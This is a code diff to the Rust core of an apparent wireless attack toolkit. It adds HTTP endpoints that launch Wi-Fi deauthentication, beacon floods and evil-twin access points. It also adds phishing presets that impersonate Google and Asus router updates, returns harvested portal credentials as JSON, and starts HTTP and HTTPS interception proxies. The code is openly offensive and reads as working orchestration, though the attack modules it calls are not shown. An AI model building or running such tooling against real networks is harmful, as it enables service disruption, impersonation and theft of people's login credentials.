@@ -1,3 +1,5 @@
+#![allow(dead_code)]
+
 use serde::{Deserialize, Serialize};
 use std::env;
 use std::fs;
@@ -18,6 +20,9 @@ mod hostapd;
 mod dhcp;
 mod dns;
 mod captive_portal;
+mod deauth;
+mod beacon_flood;
+mod http_proxy;
 mod mitm;
 mod recon;
 mod plugin_system;
@@ -28,49 +33,15 @@ mod networking;
 mod improvements;
 mod https_detection;
 mod logging;
+mod config;
 
-#[derive(Clone, Debug, Deserialize, Serialize)]
-struct AppInfo {
-    name: String,
-    environment: String,
-    api_url: String,
-    core_url: String,
-}
+use crate::config::{AppConfig, Profile};
+use std::sync::{Mutex, OnceLock};
 
-#[derive(Clone, Debug, Deserialize, Serialize)]
-struct NetworkConfig {
-    default_interface: String,
-    captive_portal: bool,
-    template: String,
-    portal_ip: String,
-    portal_port: Option<u16>,
-    portal_fallback_port: Option<u16>,
-    dns_ip: String,
-    subnet: Option<u8>,
-}
+static APP_CONFIG: OnceLock<Mutex<AppConfig>> = OnceLock::new();
 
-#[derive(Clone, Debug, Deserialize, Serialize)]
-struct LoggingConfig {
-    level: String,
-}
-
-#[derive(Clone, Debug, Deserialize, Serialize)]
-struct Profile {
-    name: String,
-    ssid: String,
-    password: String,
-    channel: i32,
-    mode: String,
-    dhcp_enabled: bool,
-}
-
-#[derive(Clone, Debug, Deserialize, Serialize)]
-struct AppConfig {
-    app: AppInfo,
-    network: NetworkConfig,
-    logging: LoggingConfig,
-    active_profile: Option<String>,
-    profiles: Option<Vec<Profile>>,
+fn get_app_config() -> &'static Mutex<AppConfig> {
+    APP_CONFIG.get().expect("AppConfig not initialized")
 }
 
 #[derive(Clone, Debug, Deserialize, Serialize)]
@@ -198,16 +169,6 @@ fn request_body(request: &str) -> &str {
     request.split("\r\n\r\n").nth(1).unwrap_or("")
 }
 
-fn profile_into_ap_profile(profile: &Profile) -> ap_manager::ApProfile {
-    ap_manager::ApProfile {
-        ssid: profile.ssid.clone(),
-        password: profile.password.clone(),
-        channel: profile.channel as u8,
-        mode: profile.mode.clone(),
-        dhcp_enabled: profile.dhcp_enabled,
-    }
-}
-
 fn save_config(path: &Path, cfg: &AppConfig) -> Result<(), String> {
     let raw = serde_yaml::to_string(cfg).map_err(|e| format!("failed to serialize config: {}", e))?;
     fs::write(path, raw).map_err(|e| format!("failed to write config: {}", e))
@@ -261,6 +222,26 @@ struct InterfaceRequest {
     subnet: Option<String>,
 }
 
+#[derive(Deserialize)]
+struct DeauthRequest {
+    interface: String,
+    bssid: String,
+    client: Option<String>,
+    count: Option<u32>,
+}
+
+#[derive(Deserialize)]
+struct EvilTwinRequest {
+    interface: String,
+    ssid: String,
+}
+
+#[derive(Deserialize)]
+struct BeaconRequest {
+    interface: String,
+    ssids: Vec<String>,
+}
+
 fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_path: &PathBuf) {
     let mut buffer = [0; 4096];
     let size = match stream.read(&mut buffer) {
@@ -292,13 +273,14 @@ fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_p
                 write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                 return;
             }
-            let config = match load_config(config_path) {
-                Ok(cfg) => cfg,
-                Err(err) => {
-                    write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
-                    return;
-                }
-            };
+
+            let mut config = get_app_config().lock().unwrap().clone();
+
+            // Override with current runtime environment variable for backward compatibility
+            if let Ok(iface) = std::env::var("AP1_IFACE") {
+                config.network.default_interface = iface;
+            }
+
             let plugins = match load_plugin_config(plugin_config_path) {
                 Ok(list) => list,
                 Err(_) => Vec::new(),
@@ -317,13 +299,7 @@ fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_p
                 write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                 return;
             }
-            let config = match load_config(config_path) {
-                Ok(cfg) => cfg,
-                Err(err) => {
-                    write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
-                    return;
-                }
-            };
+            let config = get_app_config().lock().unwrap().clone();
             let body = serde_json::to_string(&config).unwrap_or_else(|_| "{}".to_string());
             write_json_response(stream, "200 OK", &body);
         }
@@ -411,13 +387,7 @@ fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_p
                 write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                 return;
             }
-            let config = match load_config(config_path) {
-                Ok(cfg) => cfg,
-                Err(err) => {
-                    write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
-                    return;
-                }
-            };
+            let config = get_app_config().lock().unwrap().clone();
             let portal_cfg = portal_config_from_app(&config);
             captive_portal::start_portal_with_config(portal_cfg.clone());
             traffic_engine::start_traffic_engine(&portal_interface(&config), &portal_cfg.portal_ip);
@@ -428,18 +398,14 @@ fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_p
                 write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                 return;
             }
-            let config = match load_config(config_path) {
-                Ok(cfg) => cfg,
-                Err(err) => {
-                    write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
-                    return;
-                }
-            };
+            let config = get_app_config().lock().unwrap().clone();
             let iface = portal_interface(&config);
-            let portal_ip = portal_ip(&config);
-            captive_portal::stop_portal();
-            traffic_engine::stop_traffic_engine(&iface, &portal_ip);
-            write_json_response(stream, "200 OK", "{\"status\":\"portal stopped\"}");
+            let portal_cfg = portal_config_from_app(&config);
+            if let Err(err) = orchestrator::stop_ap_session(&iface, &portal_cfg) {
+                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
+                return;
+            }
+            write_json_response(stream, "200 OK", "{\"status\":\"AP session stopped\"}");
         }
         "/api/portal/status" => {
             if method != "GET" {
@@ -447,7 +413,26 @@ fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_p
                 return;
             }
             let is_running = captive_portal::is_running();
-            let body = format!("{{\"running\":{} }}", is_running);
+            let credentials = captive_portal::read_credentials();
+
+            // Convert simple strings to JSON objects for the CLI
+            let mut cred_objs = Vec::new();
+            for line in credentials {
+                let mut obj = serde_json::Map::new();
+                for part in line.split_whitespace() {
+                    let kv: Vec<&str> = part.splitn(2, '=').collect();
+                    if kv.len() == 2 {
+                        obj.insert(kv[0].to_string(), serde_json::Value::String(kv[1].to_string()));
+                    }
+                }
+                cred_objs.push(serde_json::Value::Object(obj));
+            }
+
+            let response = serde_json::json!({
+                "running": is_running,
+                "credentials": cred_objs
+            });
+            let body = response.to_string();
             write_json_response(stream, "200 OK", &body);
         }
         "/api/portal/credentials" => {
@@ -456,8 +441,243 @@ fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_p
                 return;
             }
             let credentials = captive_portal::read_credentials();
-            let body = serde_json::to_string(&credentials).unwrap_or_else(|_| "[]".to_string());
+            let mut cred_objs = Vec::new();
+            for line in credentials {
+                let mut obj = serde_json::Map::new();
+                for part in line.split_whitespace() {
+                    let kv: Vec<&str> = part.splitn(2, '=').collect();
+                    if kv.len() == 2 {
+                        obj.insert(kv[0].to_string(), serde_json::Value::String(kv[1].to_string()));
+                    }
+                }
+                cred_objs.push(serde_json::Value::Object(obj));
+            }
+            let body = serde_json::Value::Array(cred_objs).to_string();
             write_json_response(stream, "200 OK", &body);
+        }
+        "/api/config/set_interface" => {
+            if method != "POST" {
+                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
+                return;
+            }
+            let body = request_body(&request);
+            let payload: InterfaceRequest = match serde_json::from_str(body) {
+                Ok(payload) => payload,
+                Err(err) => {
+                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
+                    return;
+                }
+            };
+            if let Some(iface) = payload.interface {
+                std::env::set_var("AP1_IFACE", &iface);
+                let mut config = get_app_config().lock().unwrap();
+                config.network.default_interface = iface.clone();
+                let _ = save_config(config_path, &config);
+                write_json_response(stream, "200 OK", &format!("{{\"status\":\"interface set to {}\"}}", iface));
+            } else {
+                write_response(stream, "400 Bad Request", "{\"error\":\"interface is required\"}", "application/json");
+            }
+        }
+        "/api/config/update" => {
+            if method != "POST" {
+                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
+                return;
+            }
+            let body = request_body(&request);
+            let json_body: serde_json::Value = match serde_json::from_str(body) {
+                Ok(v) => v,
+                Err(_) => {
+                    write_response(stream, "400 Bad Request", "{\"error\":\"invalid json\"}", "application/json");
+                    return;
+                }
+            };
+
+            let mut config = get_app_config().lock().unwrap();
+            let active_profile_name = config.active_profile.clone().unwrap_or_else(|| "default".to_string());
+
+            if let Some(val) = json_body.get("ssid") {
+                if let Some(ssid) = val.as_str() {
+                    if let Some(profiles) = config.profiles.as_mut() {
+                        if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
+                            p.ssid = ssid.to_string();
+                        }
+                    }
+                }
+            }
+            if let Some(val) = json_body.get("channel") {
+                if let Some(ch) = val.as_i64() {
+                    if let Some(profiles) = config.profiles.as_mut() {
+                        if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
+                            p.channel = ch as i32;
+                        }
+                    }
+                }
+            }
+            if let Some(val) = json_body.get("password") {
+                if let Some(pass) = val.as_str() {
+                    if let Some(profiles) = config.profiles.as_mut() {
+                        if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
+                            p.password = pass.to_string();
+                        }
+                    }
+                }
+            }
+            if let Some(val) = json_body.get("security") {
+                if let Some(sec) = val.as_str() {
+                    if let Some(profiles) = config.profiles.as_mut() {
+                        if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
+                            p.security = Some(sec.to_string());
+                        }
+                    }
+                }
+            }
+
+            let _ = save_config(config_path, &config);
+            write_json_response(stream, "200 OK", "{\"status\":\"config updated\"}");
+        }
+        "/api/config/preset" => {
+            if method != "POST" {
+                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
+                return;
+            }
+            let body = request_body(&request);
+            let json_body: serde_json::Value = match serde_json::from_str(body) {
+                Ok(v) => v,
+                Err(_) => {
+                    write_response(stream, "400 Bad Request", "{\"error\":\"invalid json\"}", "application/json");
+                    return;
+                }
+            };
+
+            let mut config = get_app_config().lock().unwrap();
+            let active_profile_name = config.active_profile.clone().unwrap_or_else(|| "default".to_string());
+
+            if let Some(name) = json_body.get("name").and_then(|v| v.as_str()) {
+                match name {
+                    "open_nav" => {
+                        config.network.captive_portal = false;
+                        if let Some(profiles) = config.profiles.as_mut() {
+                            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
+                                p.ssid = "Free_Internet".to_string();
+                                p.security = Some("open".to_string());
+                            }
+                        }
+                    },
+                    "google_phish" => {
+                        config.network.captive_portal = true;
+                        config.network.template = "Google".to_string();
+                        if let Some(profiles) = config.profiles.as_mut() {
+                            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
+                                p.ssid = "Google_Free_Wifi".to_string();
+                                p.security = Some("open".to_string());
+                            }
+                        }
+                    },
+                    "router_attack" => {
+                        config.network.captive_portal = true;
+                        config.network.template = "RouterLogin".to_string();
+                        if let Some(profiles) = config.profiles.as_mut() {
+                            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
+                                p.ssid = "Asus_Router_Update".to_string();
+                                p.security = Some("open".to_string());
+                            }
+                        }
+                    },
+                    _ => {
+                        write_response(stream, "400 Bad Request", "{\"error\":\"unknown preset\"}", "application/json");
+                        return;
+                    }
+                }
+                let _ = save_config(config_path, &config);
+                write_json_response(stream, "200 OK", &format!("{{\"status\":\"preset {} applied\"}}", name));
+            } else {
+                write_response(stream, "400 Bad Request", "{\"error\":\"name is required\"}", "application/json");
+            }
+        }
+        "/api/recon/networks" => {
+            if method != "GET" {
+                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
+                return;
+            }
+            // Logic for scanning handled in Go for interfaces,
+            // but we add congestion endpoint here
+            write_json_response(stream, "200 OK", "{\"status\":\"ok\"}");
+        }
+        "/api/recon/congestion" => {
+            if method != "GET" {
+                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
+                return;
+            }
+            recon::analyze_congestion("wlan0");
+            write_json_response(stream, "200 OK", "{\"status\":\"analysis printed to core log\"}");
+        }
+        "/api/deauth/start" => {
+            if method != "POST" {
+                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
+                return;
+            }
+            let body = request_body(&request);
+            let payload: DeauthRequest = match serde_json::from_str(body) {
+                Ok(payload) => payload,
+                Err(err) => {
+                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
+                    return;
+                }
+            };
+            let count = payload.count.unwrap_or(10);
+            let result = if let Some(client) = payload.client {
+                deauth::deauth_client(&payload.interface, &payload.bssid, &client, count)
+            } else {
+                deauth::deauth_all(&payload.interface, &payload.bssid)
+            };
+            match result {
+                Ok(out) => write_json_response(stream, "200 OK", &format!("{{\"status\":\"deauth started\", \"output\":\"{}\"}}", out.replace("\"", "\\\""))),
+                Err(err) => write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json"),
+            }
+        }
+        "/api/eviltwin/start" => {
+            if method != "POST" {
+                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
+                return;
+            }
+            let body = request_body(&request);
+            let payload: EvilTwinRequest = match serde_json::from_str(body) {
+                Ok(payload) => payload,
+                Err(err) => {
+                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
+                    return;
+                }
+            };
+            let config = get_app_config().lock().unwrap().clone();
+            let portal_cfg = portal_config_from_app(&config);
+            if let Err(err) = orchestrator::start_evil_twin(&payload.interface, &payload.ssid, &portal_cfg) {
+                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
+                return;
+            }
+            write_json_response(stream, "200 OK", &format!("{{\"status\":\"evil twin for {} started\"}}", payload.ssid));
+        }
+        "/api/beacon/start" => {
+            if method != "POST" {
+                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
+                return;
+            }
+            let body = request_body(&request);
+            let payload: BeaconRequest = match serde_json::from_str(body) {
+                Ok(payload) => payload,
+                Err(err) => {
+                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
+                    return;
+                }
+            };
+            // Start flooding
+            let flood = beacon_flood::BeaconFlood::new();
+            flood.start(&payload.interface, payload.ssids);
+            write_json_response(stream, "200 OK", "{\"status\":\"beacon flood started\"}");
+        }
+        "/api/beacon/stop" => {
+             // Logic to stop flood (simplified for now)
+             let _ = std::process::Command::new("pkill").arg("-f").arg("mdk4").output();
+             write_json_response(stream, "200 OK", "{\"status\":\"beacon flood stopped\"}");
         }
         "/api/profiles/select" => {
             if method != "POST" {
@@ -476,13 +696,7 @@ fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_p
                 write_response(stream, "400 Bad Request", "{\"error\":\"profile is required\"}", "application/json");
                 return;
             }
-            let mut config = match load_config(config_path) {
-                Ok(cfg) => cfg,
-                Err(err) => {
-                    write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
-                    return;
-                }
-            };
+            let mut config = get_app_config().lock().unwrap().clone();
             let profiles = match &config.profiles {
                 Some(list) => list,
                 None => {
@@ -490,28 +704,32 @@ fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_p
                     return;
                 }
             };
-            let selected = profiles.iter().find(|p| p.name == payload.profile);
+            let selected = profiles.iter().find(|p| p.name == payload.profile).cloned();
             if selected.is_none() {
                 write_response(stream, "404 Not Found", "{\"error\":\"profile not found\"}", "application/json");
                 return;
             }
             config.active_profile = Some(payload.profile.clone());
+            {
+                let mut global_cfg = get_app_config().lock().unwrap();
+                *global_cfg = config.clone();
+            }
             if let Err(err) = save_config(config_path, &config) {
                 write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
                 return;
             }
-            let _iface = if config.network.default_interface.is_empty() { "wlan0" } else { &config.network.default_interface };
-            let ap_profile = profile_into_ap_profile(selected.unwrap());
-            ap_manager::activate_profile(&ap_profile);
-            if config.network.captive_portal {
-                let portal_cfg = portal_config_from_app(&config);
-                captive_portal::start_portal_with_config(portal_cfg.clone());
-                traffic_engine::start_traffic_engine(_iface, &portal_cfg.portal_ip);
+            let iface = if let Ok(env_iface) = std::env::var("AP1_IFACE") {
+                env_iface
+            } else if config.network.default_interface.is_empty() {
+                "wlan0".to_string()
             } else {
-                let portal_ip = portal_ip(&config);
-                traffic_engine::start_traffic_engine(_iface, &portal_ip);
+                config.network.default_interface.clone()
+            };
+            let portal_cfg = portal_config_from_app(&config);
+            if let Err(err) = orchestrator::start_ap_session(&iface, &selected.unwrap(), &portal_cfg, config.network.captive_portal) {
+                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
+                return;
             }
-            system_control::restart_system_services();
             write_json_response(stream, "200 OK", &format!("{{\"status\":\"profile {} activated\"}}", payload.profile));
         }
         _ => write_response(stream, "404 Not Found", "Not found", "text/plain"),
@@ -548,6 +766,7 @@ fn main() -> std::io::Result<()> {
     let config = load_config(&config_path).unwrap_or_else(|err| {
         panic!("Unable to load config: {}", err);
     });
+    APP_CONFIG.set(Mutex::new(config.clone())).expect("Failed to set initial AppConfig");
 
     let listen_addr = extract_listen_addr(&config);
     let listener = TcpListener::bind(&listen_addr)?;
@@ -563,8 +782,6 @@ fn main() -> std::io::Result<()> {
     } else {
         config.network.portal_ip.clone()
     };
-    let portal_port = config.network.portal_port.unwrap_or(80);
-    let fallback_port = config.network.portal_fallback_port.unwrap_or(8000);
     let _dns_ip = if config.network.dns_ip.is_empty() {
         portal_ip.clone()
     } else {
@@ -572,25 +789,18 @@ fn main() -> std::io::Result<()> {
     };
     let _subnet = config.network.subnet.unwrap_or(24);
 
-    let network_iface = if config.network.default_interface.is_empty() {
-        "wlan0"
+    let network_iface = if let Ok(env_iface) = std::env::var("AP1_IFACE") {
+        if !env_iface.is_empty() { env_iface } else { "wlan0".to_string() }
+    } else if !config.network.default_interface.is_empty() {
+        config.network.default_interface.clone()
     } else {
-        &config.network.default_interface
+        "wlan0".to_string()
     };
+    let network_iface = &network_iface;
+    println!("[*] Core using interface: {}", network_iface);
 
     if config.network.captive_portal {
-        let portal_cfg = captive_portal::PortalConfig {
-            template_dir: if config.network.template.is_empty() {
-                "../config/templates/DarkLogin".to_string()
-            } else {
-                format!("../config/templates/{}", config.network.template)
-            },
-            log_path: "../system/runtime/portal_credentials.log".to_string(),
-            portal_ip: portal_ip.clone(),
-            portal_port,
-            fallback_port,
-        };
-        captive_portal::start_portal_with_config(portal_cfg);
+        // Handled by orchestrator::start_ap_session
     }
 
     if let Err(err) = packet_capture::start(network_iface, "../system/runtime/packet_capture.log") {
@@ -608,6 +818,7 @@ fn main() -> std::io::Result<()> {
             channel: 1,
             mode: "g".to_string(),
             dhcp_enabled: true,
+            security: Some("wpa2".to_string()),
         })
     } else {
         config.profiles.as_ref().and_then(|profiles| profiles.first().cloned()).unwrap_or(Profile {
@@ -617,6 +828,7 @@ fn main() -> std::io::Result<()> {
             channel: 1,
             mode: "g".to_string(),
             dhcp_enabled: true,
+            security: Some("wpa2".to_string()),
         })
     };
 
@@ -625,11 +837,13 @@ fn main() -> std::io::Result<()> {
     }
     plugin_system::trigger_hook("pre_ap_start", &plugin_config_path);
 
-    let ap_profile = profile_into_ap_profile(&profile);
-    ap_manager::activate_profile(&ap_profile);
-    traffic_engine::start_traffic_engine(network_iface, &portal_ip);
+    let portal_cfg = portal_config_from_app(&config);
+    if let Err(e) = orchestrator::start_ap_session(network_iface, &profile, &portal_cfg, config.network.captive_portal) {
+        eprintln!("Failed to start AP session: {}", e);
+    }
+    http_proxy::start_proxy(8080);
+    https_detection::start_https_interceptor(8443);
     proxy::init_proxy();
-    system_control::restart_system_services();
     orchestrator::start_module("core");
 
     for stream in listener.incoming() {
